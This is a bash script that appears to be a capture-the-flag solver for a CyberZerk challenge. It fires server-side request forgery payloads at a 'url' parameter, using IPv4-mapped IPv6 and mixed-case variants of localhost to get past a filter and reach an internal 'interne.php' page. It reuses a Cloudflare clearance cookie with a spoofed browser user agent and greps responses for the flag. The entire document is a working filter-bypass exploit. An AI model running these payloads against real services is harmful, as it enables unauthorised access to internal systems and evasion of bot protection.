#!/usr/bin/env bash
CF="$1"
BASE="https://restructuration.cyberzerk.fr/"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36"
payloads=(
  "http://[::ffff:7f00:1]/interne.php"
  "http://[::ffff:7f00:0001]/interne.php"
  "http://[0:0:0:0:0:ffff:7f00:1]/interne.php"
  "http://LOCALHOST/interne.php"
  "http://LocalHost/interne.php"
  "http://[::ffff:7f00:1]:80/interne.php"
)
for p in "${payloads[@]}"; do
  printf '>> %-34s ' "$p"
  body=$(curl -sG "$BASE" --data-urlencode "url=$p" \
    -H "user-agent: $UA" -b "cf_clearance=$CF" --max-time 15)
  hit=$(printf '%s' "$body" | grep -aoiE \
    'Impossible de récupérer|interdit par la politique|Schéma non autorisé|votre IP[^<]*|CyberZerk\{[^}]*\}' | head -1)
  echo "${hit:-?? RESPOSTA DIFERENTE}"
  if printf '%s' "$body" | grep -aqiE 'CyberZerk\{|votre IP' || [ -z "$hit" ]; then
    echo "----- corpo -----"; printf '%s\n' "$body" | sed -n '1,60p'; echo "-----------------"
  fi
  sleep 1
done
